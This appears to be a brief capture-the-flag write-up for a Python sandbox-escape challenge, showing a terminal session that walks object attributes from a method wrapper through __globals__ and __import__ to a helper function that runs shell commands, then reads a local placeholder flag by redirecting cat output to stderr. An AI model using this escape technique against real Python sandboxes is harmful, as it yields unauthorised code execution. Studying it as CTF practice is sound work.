# solve

see solve.txt

```
quasar@quasar098:~/...REDACTED.../challenges/underscore/solve$ cat solve.txt - | nc localhost 5000
obj <method-wrapper '__call__' of type object at 0x650e80c5ed70>
1=getitem, 2=getattr, 3=call
> under > obj <class '__main__.Sandbox'>
1=getitem, 2=getattr, 3=call
> under > obj <function Sandbox.__init__ at 0x7ebc1fb5ed40>
1=getitem, 2=getattr, 3=call
> under > obj {'__name__': '__main__', '__doc__': None, '__package__': None, '__loader__': <_frozen_importlib_external.SourceFileLoader object at 0x7ebc1fb73c10>, '__spec__': None, '__annotations__': {}, '__builtins__': <module 'builtins' (built-in)>, '__file__': '/app/run', '__cached__': None, 'Sandbox': <class '__main__.Sandbox'>, 'obj': {...}, 'getitems_left': 1, 'calls_left': 2, 'inp': 2, 'inp2': '__globals__'}
1=getitem, 2=getattr, 3=call
> under > obj <module 'builtins' (built-in)>
1=getitem, 2=getattr, 3=call
> under > obj <built-in function __import__>
1=getitem, 2=getattr, 3=call
> under > obj <module '_osx_support' from '/usr/local/lib/python3.10/_osx_support.py'>
1=getitem, 2=getattr, 3=call
> under > obj <function _read_output at 0x7ebc1f9fa4d0>
1=getitem, 2=getattr, 3=call
> under > ls
ls
ls  # notice no output since stdout is used for backticks stuff
catq
bash: line 4: catq: command not found  # stderr is still available tho!
cat flag.txt 1>&2
jail{flag_will_be_here_on_remote}
```

